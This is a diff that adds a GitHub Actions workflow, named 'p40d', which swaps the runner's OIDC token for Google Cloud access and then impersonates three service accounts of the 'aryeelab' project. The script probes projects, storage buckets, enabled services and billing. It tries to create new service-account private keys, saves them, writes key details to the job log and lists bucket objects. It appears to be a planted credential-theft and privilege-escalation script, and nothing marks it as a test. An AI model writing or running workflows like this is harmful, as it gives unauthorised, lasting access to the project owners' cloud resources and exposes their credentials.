@@ -1,0 +1,53 @@
+name: p40d
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  p40d:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - name: p40d
+        run: |
+          set +e
+          PRJ='projects/303574531351/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider'
+          NUM=303574531351
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          jq -n '{keyAlgorithm:"KEY_ALG_RSA_2048"}' > keyreq.json
+          for a in 1 2 3; do
+            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com/$PRJ")
+            echo "$J" | jq -r '.value // empty' > tok.jwt
+            [ -s tok.jwt ] && break
+            sleep 3
+          done
+          curl -s -o r.json -X POST https://sts.googleapis.com/v1/token \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+            --data-urlencode "subject_token=$(cat tok.jwt)" \
+            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+            -d "scope=https://www.googleapis.com/auth/cloud-platform"
+          FT=$(jq -r '.access_token // empty' r.json)
+          echo "##FT len=${#FT}"
+          for SA in github-actions@aryeelab.iam.gserviceaccount.com 303574531351-compute@developer.gserviceaccount.com firebase-adminsdk-fbsvc@aryeelab.iam.gserviceaccount.com; do
+            curl -s -o g.json -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json
+            T=$(jq -r '.accessToken // empty' g.json)
+            echo "##GEN sa=$SA toklen=${#T}"
+            [ -z "$T" ] && continue
+            echo "##PROBE sa=$SA projects-get=$(curl -s -o p.json -w '%{http_code}' -H "Authorization: Bearer $T" https://cloudresourcemanager.googleapis.com/v1/projects/$NUM) body=$(head -c 200 p.json | tr -d '\n' | tr -s ' ')"
+            echo "##PROBE sa=$SA project-list=$(curl -s -o pl.json -w '%{http_code}' -H "Authorization: Bearer $T" 'https://cloudresourcemanager.googleapis.com/v1/projects?pageSize=5') body=$(head -c 300 pl.json | tr -d '\n' | tr -s ' ')"
+            echo "##PROBE sa=$SA buckets-list=$(curl -s -o b.json -w '%{http_code}' -H "Authorization: Bearer $T" "https://storage.googleapis.com/storage/v1/b?project=$NUM") names=$(jq -r '.items[]?.name' b.json 2>/dev/null | tr '\n' ',')"
+            echo "##PROBE sa=$SA usage-enabled=$(curl -s -o u.json -w '%{http_code}' -H "Authorization: Bearer $T" "https://serviceusage.googleapis.com/v1/projects/$NUM/services?filter=state:ENABLED&pageSize=60") enabled=$(jq -r '[.services[]?.config.name] | join(",")' u.json 2>/dev/null | head -c 800)"
+            echo "##PROBE sa=$SA billing=$(curl -s -o bb.json -w '%{http_code}' -H "Authorization: Bearer $T" "https://cloudbilling.googleapis.com/v1/projects/aryeelab/billingInfo") body=$(head -c 200 bb.json | tr -d '\n' | tr -s ' ')"
+            kc=$(curl -s -o k.json -w '%{http_code}' -X POST -H "Authorization: Bearer $T" -H "Content-Type: application/json" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA/keys" -d @keyreq.json)
+            echo "##KEYCREATE sa=$SA code=$kc body=$(head -c 400 k.json | tr -d '\n' | tr -s ' ')"
+            if [ "$kc" = "200" ]; then jq -c '{type,name,private_key_id,client_email,client_id,private_key_present:(.private_key!=null)}' k.json > sa_fragment.json; echo "##SAJSON $(cat sa_fragment.json)"; cp k.json "key_$SA.json"; fi
+          done
+          echo '### storage object listing on first bucket'
+          T=$(curl -s -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/303574531351-compute@developer.gserviceaccount.com:generateAccessToken" -d @req.json | jq -r '.accessToken')
+          for B in artifacts.aryeelab.appspot.com; do
+            echo "##OBJ bucket=$B code=$(curl -s -o ob.json -w '%{http_code}' -H "Authorization: Bearer $T" "https://storage.googleapis.com/storage/v1/b/$B/o?maxResults=5") body=$(head -c 500 ob.json | tr -d '\n' | tr -s ' ')"
+          done
+          echo "##FINISHED4"
